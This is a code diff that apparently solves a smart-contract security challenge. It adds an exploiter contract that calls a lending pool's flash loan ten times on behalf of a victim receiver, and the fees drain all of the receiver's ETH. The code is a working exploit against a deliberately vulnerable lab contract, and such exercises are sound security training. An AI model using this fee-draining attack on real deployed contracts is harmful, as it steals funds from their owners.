@@ -48,6 +48,9 @@ contract NaiveReceiver is Test {
         /**
          * EXPLOIT START *
          */
+        FlashLoanReceiverExploiter exploiter =
+            new FlashLoanReceiverExploiter(address(flashLoanReceiver), naiveReceiverLenderPool);
+        exploiter.exploit();
 
         /**
          * EXPLOIT END *
@@ -60,5 +63,22 @@ contract NaiveReceiver is Test {
         // All ETH has been drained from the receiver
         assertEq(address(flashLoanReceiver).balance, 0);
         assertEq(address(naiveReceiverLenderPool).balance, ETHER_IN_POOL + ETHER_IN_RECEIVER);
+    }
+}
+
+contract FlashLoanReceiverExploiter {
+    address victim;
+    NaiveReceiverLenderPool pool;
+
+    constructor(address _victim, NaiveReceiverLenderPool _pool) {
+        victim = _victim;
+        pool = _pool;
+    }
+
+    // Drain victim contract funds by doing several flash loan with fees
+    function exploit() external {
+        for (uint256 i; i < 10; i++) {
+            pool.flashLoan(victim, 1);
+        }
     }
 }
